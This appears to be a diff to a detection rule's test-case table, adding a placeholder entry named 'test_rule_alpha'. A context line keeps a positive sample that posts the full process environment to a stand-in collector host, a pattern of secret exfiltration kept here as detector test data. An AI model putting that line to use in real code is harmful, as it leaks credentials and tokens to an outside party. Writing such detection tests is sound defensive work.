@@ -32,6 +32,10 @@ CASES = {
         "positive": "requests.post('https://collector.example.com', data=os.environ)",
         "negative": "requests.get('https://example.com/status')",
     },
+    "test_rule_alpha": {
+        "positive": "This is a test case.",
+        "negative": "This is a benign case.",
+    },
 }
 
 
